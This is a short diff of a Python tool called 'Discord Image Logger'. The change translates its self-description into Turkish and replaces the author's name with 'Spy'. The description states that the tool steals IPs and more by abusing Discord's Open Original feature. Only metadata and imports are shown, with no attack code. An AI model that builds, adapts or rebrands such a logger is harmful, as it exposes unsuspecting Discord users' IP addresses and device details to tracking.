@@ -6,9 +6,9 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "Discord'un Orijinali Aç özelliğini kötüye kullanarak IP'leri ve daha fazlasını çalmanıza olanak tanıyan basit bir uygulama"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Spy"
 
 config = {
     # BASE CONFIG #
